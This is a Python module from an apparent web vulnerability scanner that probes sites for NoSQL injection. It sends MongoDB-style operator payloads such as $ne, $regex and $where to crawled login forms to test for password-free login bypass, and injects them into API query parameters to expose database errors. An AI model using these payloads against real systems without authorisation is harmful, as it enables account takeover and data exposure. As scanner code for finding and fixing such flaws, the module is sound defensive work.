"""NoSQL Injection probe (MongoDB/CouchDB style operators)."""
from __future__ import annotations

import json
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.recon.crawler import get_state

JSON_PAYLOADS = [
    {"$ne": None}, {"$gt": ""}, {"$regex": ".*"},
    {"$where": "1==1"}, {"$exists": True},
]
URL_PAYLOADS = [
    "[$ne]=null", "[$gt]=", "[$regex]=.*", "[$exists]=true",
]
SUCCESS_HINT = ("welcome", "dashboard", "logout", "berhasil", "selamat")
ERROR_HINT = ("mongo", "bson", "$ne", "couchdb", "$where", "syntaxerror in javascript")


def _login_form(config: ScanConfig) -> dict | None:
    s = get_state(config)
    if not s:
        return None
    for f in s.forms:
        if any((i.get("type") or "").lower() == "password" for i in f["inputs"]):
            return f
    return None


def _api_urls(config: ScanConfig) -> list[str]:
    s = get_state(config)
    if not s:
        return []
    return [u for u in s.param_urls if "/api/" in u or "/v1/" in u or "/v2/" in u][:5]


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        # 1. JSON injection on login form via API
        form = _login_form(config)
        if form and form.get("action"):
            user_field = next((i["name"] for i in form["inputs"]
                               if (i.get("name") or "").lower() in ("username", "email", "user")), None)
            pass_field = next((i["name"] for i in form["inputs"]
                               if (i.get("type") or "").lower() == "password"), None)
            if user_field and pass_field:
                for payload in JSON_PAYLOADS[:3]:
                    body = {user_field: payload, pass_field: payload}
                    r = client.post(form["action"], json=body)
                    if r is None:
                        continue
                    text = (r.text or "").lower()
                    if r.status_code in (200, 302) and any(h in text for h in SUCCESS_HINT):
                        findings.append(Finding(
                            module="nosqli", target=form["action"],
                            title=f"Bypass login NoSQL berhasil: {payload}",
                            severity=Severity.CRITICAL,
                            description="Endpoint login menerima MongoDB operator dan login lolos tanpa password.",
                            evidence=f"payload={payload} status={r.status_code}",
                            cwe="CWE-943",
                            remediation="Validasi tipe input (string saja), pakai parameterized query, jangan langsung pass body ke find().",
                        ))
                        return findings

        # 2. URL operator injection
        for url in _api_urls(config):
            parsed = urlparse(url)
            params = list(parse_qsl(parsed.query))
            if not params:
                continue
            k0, v0 = params[0]
            for op in URL_PAYLOADS:
                new_q = urlencode(params[1:]) + (f"&{k0}{op}" if params[1:] else f"{k0}{op}")
                mutated = urlunparse(parsed._replace(query=new_q))
                r = client.get(mutated)
                if r is None:
                    continue
                t = (r.text or "").lower()
                if any(e in t for e in ERROR_HINT):
                    findings.append(Finding(
                        module="nosqli", target=mutated,
                        title=f"Error NoSQL terekspos pada parameter `{k0}`",
                        severity=Severity.HIGH,
                        description="Server membocorkan error MongoDB/CouchDB saat parameter dimanipulasi sebagai operator.",
                        evidence=f"payload={op}; error in body",
                        cwe="CWE-943", confidence="firm",
                        remediation="Sanitize query param ke string, jangan auto-cast ke object.",
                    ))
                    return findings
    finally:
        client.close()
    return findings
